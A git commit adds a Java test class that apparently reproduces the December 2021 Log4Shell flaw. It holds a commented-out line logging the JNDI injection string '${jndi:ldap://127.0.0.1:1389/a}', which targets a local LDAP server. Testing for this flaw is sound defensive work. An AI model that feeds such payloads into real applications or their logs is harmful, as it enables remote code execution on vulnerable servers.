d79dca9137d84cf3a66000c0342c3526f8cfd332
wuare <wuareb@gmail.com>
2021-12-10 13:54:24 +0800

    Create LogTest.java

---
+++ src/main/java/io/github/wuare/ot/LogTest.java
@@ -0,0 +1,10 @@
+package io.github.wuare.ot;
+
+public class LogTest {
+
+    // private static final Logger logger = LogManager.getLogger(LogTest.class);
+
+    public static void main(String[] args) {
+        // logger.error("${jndi:ldap://127.0.0.1:1389/a}");
+    }
+}
